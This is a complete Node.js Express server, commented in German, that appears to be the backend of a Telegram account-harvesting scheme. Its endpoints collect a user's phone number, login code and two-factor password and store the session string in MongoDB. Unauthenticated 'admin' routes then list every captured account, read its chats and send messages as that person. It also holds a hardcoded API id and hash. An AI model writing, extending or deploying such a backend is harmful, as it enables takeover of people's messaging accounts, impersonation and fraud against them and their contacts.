const express = require('express');
const cors = require('cors');
const { TelegramClient } = require('telegram');
const { StringSession } = require('telegram/sessions');
const mongoose = require('mongoose');

const app = express();
app.use(cors());
app.use(express.json());

const apiId = 23049703;
const apiHash = 'e9c00af578a9de0253ef02337460498f';

// Datenbank-Modell
mongoose.connect(process.env.MONGODB_URI);
const Session = mongoose.model('Session', new mongoose.Schema({ phone: String, session: String }));

// Globaler Cache für aktive Client-Instanzen, damit wir nicht bei jedem Request neu verbinden müssen
const clientCache = new Map();

// --- AUTH LOGIK ---
app.post('/send-otp', async (req, res) => {
    try {
        const { phone } = req.body;
        const client = new TelegramClient(new StringSession(''), apiId, apiHash, { connectionRetries: 5 });
        await client.connect();
        const code = await client.sendCode({ apiId, apiHash }, phone);
        clientCache.set(phone, { client, phoneCodeHash: code.phoneCodeHash });
        res.json({ status: 'sent', phoneCodeHash: code.phoneCodeHash });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/verify-otp', async (req, res) => {
    try {
        const { phone, code, password } = req.body;
        const cache = clientCache.get(phone);
        if (!cache) return res.status(400).json({ error: "Session abgelaufen" });

        const { client, phoneCodeHash } = cache;
        
        // Versuche Login
        try {
            await client.signIn({ phoneCode: code, phoneCodeHash: phoneCodeHash, phoneNumber: phone });
        } catch (err) {
            if (err.errorMessage === 'SESSION_PASSWORD_NEEDED') {
                await client.signIn({ password: password });
            } else { throw err; }
        }

        // Speichere Session in DB
        const stringSession = client.session.save();
        await Session.findOneAndUpdate({ phone }, { session: stringSession }, { upsert: true });
        
        res.json({ status: 'success' });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

// --- ADMIN LOGIK ---
app.get('/get-sessions', async (req, res) => {
    try {
        const sessions = await Session.find({});
        res.json(sessions.map(s => ({ phone: s.phone })));
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.get('/dialogs/:phone', async (req, res) => {
    try {
        const data = await Session.findOne({ phone: req.params.phone });
        if (!data) return res.status(404).json({ error: "Keine Sitzung gefunden" });

        const client = new TelegramClient(new StringSession(data.session), apiId, apiHash, {});
        await client.connect();
        const dialogs = await client.getDialogs();
        
        res.json(dialogs.map(d => ({ title: d.title, id: d.id.toString() })));
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.post('/send-message', async (req, res) => {
    try {
        const { phone, peerId, message } = req.body;
        const data = await Session.findOne({ phone });
        if (!data) return res.status(404).json({ error: "Session nicht gefunden" });

        const client = new TelegramClient(new StringSession(data.session), apiId, apiHash, {});
        await client.connect();
        await client.sendMessage(peerId, { message });
        
        res.json({ success: true });
    } catch (e) { res.status(500).json({ error: e.message }); }
});

app.listen(process.env.PORT || 3000, () => console.log("Server läuft."));
